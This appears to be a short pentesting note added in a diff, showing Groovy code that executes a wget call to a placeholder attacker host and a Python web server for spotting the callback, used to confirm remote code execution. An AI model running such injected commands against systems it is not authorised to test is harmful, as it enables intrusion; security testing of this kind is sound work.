@@ -1,0 +1,9 @@
+#Groovy remote code execution
+def sout = new StringBuffer(), serr = new StringBuffer() 
+def proc = 'wget http://IPADRESS:5555/nothingtosee.txt'.execute() 
+proc.consumeProcessOutput(sout,serr) 
+proc.waitForOrKill(1000) 
+print 'out> $sout err> $serr'
+
+#On your internet facing test server create a simplehttpserver with python and look for GET request
+python -m SimpleHTTPServer 5555
